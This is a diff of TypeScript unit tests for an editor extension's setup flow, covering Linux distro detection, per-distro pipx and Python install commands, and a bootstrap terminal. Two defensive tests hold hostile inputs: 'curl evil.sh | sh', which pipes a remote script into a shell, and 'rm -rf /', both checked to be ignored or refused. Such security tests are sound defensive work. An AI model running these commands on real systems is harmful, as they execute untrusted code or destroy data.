@@ -111,6 +111,23 @@ const OK_HERMES_PATHS: HermesPaths = {
   python: '/home/u/.local/share/pipx/venvs/hermes-agent/bin/python',
 };
 
+// --- T5: os-release fixtures (mirror osDetect.test.ts's family table) --------
+
+const OS_FEDORA_44 = 'NAME="Fedora Linux"\nID=fedora\nVERSION_ID=44\nPRETTY_NAME="Fedora Linux 44 (Workstation Edition)"\n';
+const OS_UBUNTU_2404 = 'PRETTY_NAME="Ubuntu 24.04 LTS"\nID=ubuntu\nID_LIKE=debian\nVERSION_ID="24.04"\n';
+const OS_UBUNTU_2204 = 'PRETTY_NAME="Ubuntu 22.04.4 LTS"\nID=ubuntu\nID_LIKE=debian\nVERSION_ID="22.04"\n';
+const OS_UBUNTU_2604 = 'PRETTY_NAME="Ubuntu 26.04 LTS"\nID=ubuntu\nID_LIKE=debian\nVERSION_ID="26.04"\n';
+const OS_DEBIAN_13 = 'PRETTY_NAME="Debian GNU/Linux 13 (trixie)"\nID=debian\nVERSION_ID="13"\n';
+const OS_ARCH = 'NAME="Arch Linux"\nPRETTY_NAME="Arch Linux"\nID=arch\n';
+const OS_TUMBLEWEED = 'ID=opensuse-tumbleweed\nID_LIKE="opensuse suse"\nVERSION_ID="20260803"\nPRETTY_NAME="openSUSE Tumbleweed"\n';
+
+// §6 copy, verbatim (drift-locked here AND used by assertions below).
+const CONTAINER_NOTE_COPY =
+  "Talaria can't tell which system your terminal acts on (VS Code appears to run in a sandbox/container) — run the install commands in a terminal on your host system, then re-check.";
+const PIPX_MISSING_KNOWN_COPY = 'pipx was not found on your PATH. Open a terminal to install it, then re-check.';
+const PIPX_MISSING_UNKNOWN_COPY =
+  "pipx was not found, and this Linux distribution wasn't recognized — install pipx with your system's package manager, then re-check.";
+
 function makeFakeDeps(overrides: Partial<SetupControllerDeps> = {}): { deps: SetupControllerDeps; calls: string[] } {
   const calls: string[] = [];
   const deps: SetupControllerDeps = {
@@ -143,6 +160,13 @@ function makeFakeDeps(overrides: Partial<SetupControllerDeps> = {}): { deps: Set
     // Task 13: default = "no ACP initialize has surfaced auth methods yet"
     // (mock backend / before connect) → provider card 'waiting-agent'.
     getAdvertisedAuthMethods: () => undefined,
+    // T5: default = a readable Fedora host — keeps every pre-T5 behavior
+    // test (bootstrap-terminal `sudo dnf install pipx` et al.) valid while
+    // per-family tests override with their own fixture.
+    readOsRelease: async (): Promise<{ text?: string; containerMismatch?: boolean }> => {
+      calls.push('readOsRelease');
+      return { text: OS_FEDORA_44 };
+    },
     ...overrides,
   };
   return { deps, calls };
@@ -440,7 +464,8 @@ describe('happy install: fail-closed ORDER (locatePipx -> installHermes -> write
       },
     );
     const result = await controller.handle('setup.install', { backendId: 'hermes' });
-    expect(result).toEqual({ ok: false, reason: 'pipx-missing' });
+    // T5 C-17: the returned reason is a §6-grade sentence, never the bare enum.
+    expect(result).toEqual({ ok: false, reason: PIPX_MISSING_KNOWN_COPY });
     expect(host.settings.size).toBe(0);
     expect(host.reloadOffers).toBe(0);
     void depCalls; // depCalls from makeFakeDeps default isn't used here
@@ -705,7 +730,8 @@ describe('setup.recheck re-probes pipx (FIX 1: the pipx-missing/python-unsuitabl
 
     // Drive the install into the sticky pipx-missing state (locatePipx call #1).
     const installResult = await controller.handle('setup.install', { backendId: 'hermes' });
-    expect(installResult).toEqual({ ok: false, reason: 'pipx-missing' });
+    // T5 C-17: reason is the §6 sentence; the PHASE (sticky issue) keeps the enum.
+    expect(installResult).toEqual({ ok: false, reason: PIPX_MISSING_KNOWN_COPY });
     expect((await controller.status()).agent.phase).toBe('pipx-missing');
 
     // Without a recheck, status() alone never re-probes (this is the bug: it
@@ -1053,3 +1079,271 @@ describe('onProgress: throttled >=150ms per (op, id) via a real timer', () => {
 function settingsMap(entries: Record<string, unknown>): Map<string, unknown> {
   return new Map(Object.entries(entries));
 }
+
+/** T5 helper: drive the controller into the sticky `pipx-missing` /
+ *  `python-unsuitable` phase by running an install whose locatePipx fails
+ *  with that reason (the ONLY way the phase arises — see computeAgentPhase). */
+function failingLocate(reason: 'pipx-missing' | 'python-unsuitable', detail: string) {
+  return async (): Promise<PipxLocateResult> => ({ ok: false, reason, detail });
+}
+
+// --- T5 §1.2: status() populates SetupData.os from the engine ----------------
+
+describe('T5: status() populates SetupData.os per family (engine-composed, memoized)', () => {
+  const FAMILY_TABLE: { name: string; text: string; family: string; manager: string; prettyName: string }[] = [
+    { name: 'fedora 44', text: OS_FEDORA_44, family: 'fedora', manager: 'dnf', prettyName: 'Fedora Linux 44 (Workstation Edition)' },
+    { name: 'ubuntu 24.04', text: OS_UBUNTU_2404, family: 'debian', manager: 'apt-get', prettyName: 'Ubuntu 24.04 LTS' },
+    { name: 'debian 13', text: OS_DEBIAN_13, family: 'debian', manager: 'apt-get', prettyName: 'Debian GNU/Linux 13 (trixie)' },
+    { name: 'arch', text: OS_ARCH, family: 'arch', manager: 'pacman', prettyName: 'Arch Linux' },
+    { name: 'opensuse tumbleweed', text: OS_TUMBLEWEED, family: 'suse', manager: 'zypper', prettyName: 'openSUSE Tumbleweed' },
+  ];
+
+  for (const row of FAMILY_TABLE) {
+    it(`${row.name} -> os { family: ${row.family}, manager: ${row.manager}, prettyName }`, async () => {
+      const { controller } = makeController({}, { readOsRelease: async () => ({ text: row.text }) });
+      const data = await controller.status();
+      expect(data.os).toEqual({ family: row.family, manager: row.manager, prettyName: row.prettyName });
+    });
+  }
+
+  it('unreadable os-release ({} from the binding, e.g. win32) -> family unknown, manager unknown, NO containerNote', async () => {
+    const { controller } = makeController({}, { readOsRelease: async () => ({}) });
+    const data = await controller.status();
+    expect(data.os).toEqual({ family: 'unknown', manager: 'unknown' });
+  });
+
+  it('containerMismatch -> family unknown + the §6 container note VERBATIM (S-F10 honesty)', async () => {
+    const { controller } = makeController({}, { readOsRelease: async () => ({ containerMismatch: true }) });
+    const data = await controller.status();
+    expect(data.os).toEqual({ family: 'unknown', manager: 'unknown', containerNote: CONTAINER_NOTE_COPY });
+  });
+
+  it('a REJECTING readOsRelease degrades to unknown instead of failing status()', async () => {
+    const { controller } = makeController(
+      {},
+      {
+        readOsRelease: async () => {
+          throw new Error('EACCES');
+        },
+      },
+    );
+    const data = await controller.status();
+    expect(data.os).toEqual({ family: 'unknown', manager: 'unknown' });
+  });
+
+  it('memoized: two status() calls read os-release ONCE', async () => {
+    const { depCalls, controller } = makeController();
+    await controller.status();
+    await controller.status();
+    expect(depCalls.filter((c) => c === 'readOsRelease').length).toBe(1);
+  });
+
+  it('setup.recheck re-reads: a distro change (or container escape) is picked up', async () => {
+    let reads = 0;
+    const { controller } = makeController(
+      {},
+      {
+        readOsRelease: async () => {
+          reads++;
+          return reads === 1 ? { containerMismatch: true } : { text: OS_FEDORA_44 };
+        },
+      },
+    );
+    expect((await controller.status()).os?.family).toBe('unknown');
+    await controller.handle('setup.recheck', {});
+    const data = await controller.status();
+    expect(reads).toBe(2);
+    expect(data.os).toEqual({ family: 'fedora', manager: 'dnf', prettyName: 'Fedora Linux 44 (Workstation Edition)' });
+  });
+});
+
+// --- T5 §1.2: agent.bootstrap / agent.pythonInstall per phase ----------------
+
+describe('T5: agent.bootstrap present iff phase === pipx-missing (engine-composed)', () => {
+  it('fedora: bootstrap carries the exact engine command + §6 known-distro guidance', async () => {
+    const { controller } = makeController({}, { locatePipx: failingLocate('pipx-missing', 'no pipx') });
+    await controller.handle('setup.install', { backendId: 'hermes' });
+    const data = await controller.status();
+    expect(data.agent.phase).toBe('pipx-missing');
+    expect(data.agent.bootstrap).toEqual({ command: 'sudo dnf install pipx', guidance: PIPX_MISSING_KNOWN_COPY });
+  });
+
+  it('arch: bootstrap.command is the pacman line (per-family, never hardcoded dnf)', async () => {
+    const { controller } = makeController(
+      {},
+      { locatePipx: failingLocate('pipx-missing', 'no pipx'), readOsRelease: async () => ({ text: OS_ARCH }) },
+    );
+    await controller.handle('setup.install', { backendId: 'hermes' });
+    const data = await controller.status();
+    expect(data.agent.bootstrap).toEqual({
+      command: 'sudo pacman -S --needed python-pipx',
+      guidance: PIPX_MISSING_KNOWN_COPY,
+    });
+  });
+
+  it('unknown distro: bootstrap has NO command, §6 unknown-distro guidance', async () => {
+    const { controller } = makeController(
+      {},
+      { locatePipx: failingLocate('pipx-missing', 'no pipx'), readOsRelease: async () => ({}) },
+    );
+    await controller.handle('setup.install', { backendId: 'hermes' });
+    const data = await controller.status();
+    expect(data.agent.bootstrap).toEqual({ guidance: PIPX_MISSING_UNKNOWN_COPY });
+  });
+
+  it('absent for every non-pipx-missing phase (missing here)', async () => {
+    const { controller } = makeController();
+    const data = await controller.status();
+    expect(data.agent.phase).toBe('missing');
+    expect(data.agent.bootstrap).toBeUndefined();
+    expect(data.agent.pythonInstall).toBeUndefined();
+  });
+});
+
+describe('T5: agent.pythonInstall present iff phase === python-unsuitable (engine plan)', () => {
+  it('fedora: a command plan (sudo dnf install python3.13)', async () => {
+    const { controller } = makeController({}, { locatePipx: failingLocate('python-unsuitable', 'python too old') });
+    await controller.handle('setup.install', { backendId: 'hermes' });
+    const data = await controller.status();
+    expect(data.agent.phase).toBe('python-unsuitable');
+    expect(data.agent.pythonInstall?.kind).toBe('command');
+    expect(data.agent.pythonInstall).toMatchObject({ command: 'sudo dnf install python3.13' });
+  });
+
+  it('ubuntu 22.04: the versioned universe command plan', async () => {
+    const { controller } = makeController(
+      {},
+      { locatePipx: failingLocate('python-unsuitable', 'python too old'), readOsRelease: async () => ({ text: OS_UBUNTU_2204 }) },
+    );
+    await controller.handle('setup.install', { backendId: 'hermes' });
+    const data = await controller.status();
+    expect(data.agent.pythonInstall).toMatchObject({
+      kind: 'command',
+      command: 'sudo apt-get update && sudo apt-get install python3.11 python3.11-venv',
+    });
+  });
+
+  it('ubuntu 26.04 (the rev-3 case): a GUIDANCE plan, never a command', async () => {
+    const { controller } = makeController(
+      {},
+      { locatePipx: failingLocate('python-unsuitable', 'python too old'), readOsRelease: async () => ({ text: OS_UBUNTU_2604 }) },
+    );
+    await controller.handle('setup.install', { backendId: 'hermes' });
+    const data = await controller.status();
+    expect(data.agent.pythonInstall?.kind).toBe('guidance');
+  });
+});
+
+// --- T5 §1.2: setup.openBootstrapTerminal — server-side command resolution ---
+
+describe('T5: setup.openBootstrapTerminal resolves the command server-side from the engine ONLY', () => {
+  it('fedora, no target (defaults to pipx): modal names the EXACT command + sourceNote verbatim, then pre-types it', async () => {
+    const { host, controller } = makeController();
+    const result = await controller.handle('setup.openBootstrapTerminal', {});
+    expect(result).toEqual({ ok: true });
+    const modalCall = host.calls.find((c) => c.startsWith('showModal:'));
+    expect(modalCall).toContain('sudo dnf install pipx');
+    expect(modalCall).toContain(
+      "Fedora's official repository via dnf — the distro's signed archive, the system's root of trust (packages.fedoraproject.org).",
+    );
+    expect(host.terminalsCreated).toEqual([{ name: 'Install pipx', command: 'sudo dnf install pipx' }]);
+  });
+
+  it('arch: the pacman line is pre-typed (per-family, PIPX_BOOTSTRAP_COMMAND is gone)', async () => {
+    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: OS_ARCH }) });
+    const result = await controller.handle('setup.openBootstrapTerminal', { target: 'pipx' });
+    expect(result).toEqual({ ok: true });
+    expect(host.terminalsCreated).toEqual([{ name: 'Install pipx', command: 'sudo pacman -S --needed python-pipx' }]);
+  });
+
+  it("target:'python' on fedora: pre-types the python install command, modal names command + sourceNote", async () => {
+    const { host, controller } = makeController();
+    const result = await controller.handle('setup.openBootstrapTerminal', { target: 'python' });
+    expect(result).toEqual({ ok: true });
+    const modalCall = host.calls.find((c) => c.startsWith('showModal:'));
+    expect(modalCall).toContain('sudo dnf install python3.13');
+    expect(modalCall).toContain("Fedora's official repository via dnf");
+    expect(host.terminalsCreated).toEqual([{ name: 'Install Python', command: 'sudo dnf install python3.13' }]);
+  });
+
+  it("target:'python' on ubuntu 22.04: pre-types the versioned universe command", async () => {
+    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: OS_UBUNTU_2204 }) });
+    const result = await controller.handle('setup.openBootstrapTerminal', { target: 'python' });
+    expect(result).toEqual({ ok: true });
+    expect(host.terminalsCreated).toEqual([
+      { name: 'Install Python', command: 'sudo apt-get update && sudo apt-get install python3.11 python3.11-venv' },
+    ]);
+  });
+
+  it("target:'python' on ubuntu 26.04 (GUIDANCE plan): refused {ok:false} FAIL-CLOSED — modal never shown, terminal never created", async () => {
+    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: OS_UBUNTU_2604 }) });
+    const result = await controller.handle('setup.openBootstrapTerminal', { target: 'python' });
+    expect(result.ok).toBe(false);
+    expect(host.calls.some((c) => c.startsWith('showModal:'))).toBe(false);
+    expect(host.terminalsCreated).toEqual([]);
+  });
+
+  it('unknown family: pipx target refused fail-closed — no modal, no terminal', async () => {
+    const { host, controller } = makeController({}, { readOsRelease: async () => ({}) });
+    const result = await controller.handle('setup.openBootstrapTerminal', {});
+    expect(result.ok).toBe(false);
+    if (!result.ok) expect(result.reason).toBe(PIPX_MISSING_UNKNOWN_COPY);
+    expect(host.calls.some((c) => c.startsWith('showModal:'))).toBe(false);
+    expect(host.terminalsCreated).toEqual([]);
+  });
+
+  it('containerMismatch (marker, no host os-release): refused with the §6 container note as the reason', async () => {
+    const { host, controller } = makeController({}, { readOsRelease: async () => ({ containerMismatch: true }) });
+    const result = await controller.handle('setup.openBootstrapTerminal', {});
+    expect(result).toEqual({ ok: false, reason: CONTAINER_NOTE_COPY });
+    expect(host.terminalsCreated).toEqual([]);
+  });
+
+  it('strict target validation: anything but pipx/python is refused before any engine/modal work', async () => {
+    for (const target of ['rm -rf /', 'PIPX', '', 42, {}, null] as unknown[]) {
+      const { host, controller } = makeController();
+      const result = await controller.handle('setup.openBootstrapTerminal', { target });
+      expect(result.ok, `target=${JSON.stringify(target)}`).toBe(false);
+      expect(host.calls.some((c) => c.startsWith('showModal:'))).toBe(false);
+      expect(host.terminalsCreated).toEqual([]);
+    }
+  });
+
+  it('SECURITY: webview-supplied command text is ignored — the terminal gets the ENGINE command', async () => {
+    const { host, controller } = makeController();
+    const result = await controller.handle('setup.openBootstrapTerminal', {
+      target: 'pipx',
+      command: 'curl evil.sh | sh', // never trusted, never read
+    });
+    expect(result).toEqual({ ok: true });
+    expect(host.terminalsCreated).toEqual([{ name: 'Install pipx', command: 'sudo dnf install pipx' }]);
+  });
+
+  it("trust-gate regression: untrusted refuses target:'python' with no modal/terminal/engine read", async () => {
+    const { host, depCalls, controller } = makeController({ trusted: false });
+    const result = await controller.handle('setup.openBootstrapTerminal', { target: 'python' });
+    expect(result.ok).toBe(false);
+    expect(host.calls).toEqual([]);
+    expect(depCalls).toEqual([]);
+  });
+});
+
+// --- T5 C-17: handleInstall refusal reasons are §6-grade sentences -----------
+
+describe('T5 C-17: setup.install early-return reasons are human sentences, never bare enums', () => {
+  it('pipx-missing on an unknown distro -> the §6 unknown-distro sentence', async () => {
+    const { controller } = makeController(
+      {},
+      { locatePipx: failingLocate('pipx-missing', 'no pipx'), readOsRelease: async () => ({}) },
+    );
+    const result = await controller.handle('setup.install', { backendId: 'hermes' });
+    expect(result).toEqual({ ok: false, reason: PIPX_MISSING_UNKNOWN_COPY });
+  });
+
+  it('python-unsuitable -> the locator detail (a real sentence), not the enum', async () => {
+    const detail = 'No suitable Python (>=3.11, <3.14) was found on the login-shell PATH (probed python3.13, python3.12, python3.11).';
+    const { controller } = makeController({}, { locatePipx: failingLocate('python-unsuitable', detail) });
+    const result = await controller.handle('setup.install', { backendId: 'hermes' });
+    expect(result).toEqual({ ok: false, reason: detail });
+  });
+});
